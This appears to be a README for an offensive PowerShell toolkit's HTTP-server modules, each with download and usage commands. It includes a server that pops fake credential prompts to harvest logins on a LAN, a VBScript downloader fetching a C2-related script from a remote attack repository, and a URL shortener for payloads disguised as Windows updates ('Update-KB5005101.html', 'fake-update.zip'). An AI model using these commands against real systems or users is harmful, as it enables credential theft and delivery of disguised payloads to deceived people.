## Module Name
   <b><i>CaptureServer.ps1</i></b>

|Function name|Description|Privileges|Notes|
|---|---|---|---|
|CaptureServer|Captute HTTP credentials on local lan (spawns credential box)|Administrator|[screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/webcreds.png)|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/CaptureServer.ps1" -OutFile "CaptureServer.ps1"
```

```powershell
Import-Module -Name ".\CaptureServer.ps1" -Force
CaptureServer -AuthType "Basic" -IPAddress "192.168.1.72" -LogFilePath "$Env:TMP\CaptureServer.txt"
Start "http://192.168.1.72:80"
```

<br />

## Module Name
   <b><i>Start-SimpleHTTPServer.ps1</i></b>
   
|Function Name|Description|Privileges|Notes|
|---|---|---|---|
|Start-SimpleHTTPServer|Simple HTTP pure powershell webserver|Administrator|Current directory its used as webroot|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/Start-SimpleHTTPServer.ps1" -OutFile "Start-SimpleHTTPServer.ps1"
```

```powershell      
Import-Module -Name ".\Start-SimpleHTTPServer.ps1" -Force
Start-SimpleHTTPServer -Port "8080"
```   

<br />

## Module Name
   <b><i>wget.vbs</i></b>
   
|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|wget.vbs|VBScript to download files from Local Lan|User Land|can be executed using **'cscript'** or **'powershell'** interpreter|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/wget.vbs" -OutFile "wget.vbs"
```

```powershell      
cscript wget.vbs http://10.11.0.5/C2Prank.ps1 C2Prank.ps1
.\wget.vbs https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/C2Prank.ps1 C2Prank.ps1
```  

<br />

## Module Name
   <b><i>Invoke-ShortUrl.ps1 - UNDER-DEVELOP (NOT STABLE)</i></b>
   
|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|Invoke-ShortUrl|TinyUrl url generator|User Land|Dependencies: python3 (http.server)|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/Invoke-shorturl.ps1" -OutFile "Invoke-ShortUrl.ps1"
```

<br />

**prerequesites checks:**
```powershell
#Make sure python (http.server) its available [optional]
python -m http.server 8089 --bind 127.0.0.1
```

```powershell
#Get module full help
Get-Help .\Invoke-ShortUrl.ps1 -Full


#URI: http://127.0.0.1:8080/Update-KB5005101.html
.\Invoke-ShortUrl.ps1 -ServerPort '127.0.0.1:8080'

#URI: http://192.168.1.72:8087/update.html
.\Invoke-ShortUrl.ps1 -ServerPort '192.168.1.72:8087' -PayloadName 'update.html'

#URI: http://192.168.1.72:8087/fake-update.zip ( verbose outputs )
.\Invoke-ShortUrl.ps1 -PayloadName 'fake-update.zip' -Verb 'true'

#URI: http://127.0.0.1:8081/Update-KB5005101.html ( start http.server )
.\Invoke-ShortUrl.ps1 -serverport '127.0.0.1:8081' -startserver 'true'

#URI: http://192.168.1.72:8087/mozlz4-win32.exe ( start http.server )
.\Invoke-ShortUrl.ps1 -Payloadname 'mozlz4-win32.exe' -startserver 'true'
```  
